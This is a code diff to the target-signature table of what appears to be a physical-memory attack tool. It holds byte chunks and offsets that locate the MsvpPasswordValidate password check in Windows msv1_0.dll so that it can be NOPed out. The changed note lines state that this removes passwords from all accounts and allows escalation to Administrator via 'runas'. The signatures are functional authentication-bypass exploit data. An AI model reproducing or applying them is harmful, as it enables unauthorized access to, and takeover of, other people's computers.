@@ -84,7 +84,7 @@ outofbounds = [0xff * max_request_size,
 # Key 'patchoffset' is optional and will be treated like 'None' if not 
 # provided.
 #
-# OS key should follow the rudimentary format 'Name Version SP Architecture'
+# OS key should follow the rudimentary format 'Name Version'
 #
 # Example signature with graphical explanation:
 #
@@ -120,7 +120,7 @@ targets=[{'OS': 'Windows 7',
           'versions': ['SP0', 'SP1'],
           'architectures': ['x32', 'x64'],
           'name': 'msv1_0.dll MsvpPasswordValidate technique',
-          'notes': 'NOPs out the jump that is called if passwords doesn\'t match. This will cause all accounts to no longer require a password.',
+          'notes': 'NOPs out the jump that is called if passwords doesn\'t match. This will cause all accounts to no longer require a password, and will also allow you to escalate privileges to Administrator via the \'runas\' command.',
           'signatures': [{'offsets': [0x2a8, 0x2a1, 0x291, 0x321], #x64 SP0-SP1
                           'chunks': [{'chunk': 0xc60f85,
                                       'internaloffset': 0x00,
@@ -142,7 +142,7 @@ targets=[{'OS': 'Windows 7',
           'versions': ['SP0'],
           'architectures': ['x86'],
           'name': 'msv1_0.dll MsvpPasswordValidate technique',
-          'notes': 'NOPs out the jump that is called if passwords doesn\'t match. This will cause all accounts to no longer require a password.',
+          'notes': 'NOPs out the jump that is called if passwords doesn\'t match. This will cause all accounts to no longer require a password, and will also allow you to escalate privileges to Administrator via the \'runas\' command.',
           'signatures': [{'offsets': [0x432, 0x80f],
                           'chunks': [{'chunk': 0x83f8107513b0018b,
                                       'internaloffset': 0x00,
@@ -152,7 +152,7 @@ targets=[{'OS': 'Windows 7',
           'versions': ['SP2', 'SP3'],
           'architectures': ['x86'],
           'name': 'msv1_0.dll MsvpPasswordValidate technique',
-          'notes': 'NOPs out the jump that is called if passwords doesn\'t match. This will cause all accounts to no longer require a password. The XP2 technique patches the call which decides if an account requires password authentication. ',
+          'notes': 'NOPs out the jump that is called if passwords doesn\'t match. This will cause all accounts to no longer require a password. The XP2 technique patches the call which decides if an account requires password authentication, and will also allow you to escalate privileges to Administrator via the \'runas\' command.',
           'signatures': [{'offsets': [0x862, 0x8aa, 0x946, 0x126, 0x9b6],
                           'chunks': [{'chunk': 0x83f8107511b0018b,
                                       'internaloffset': 0x00,
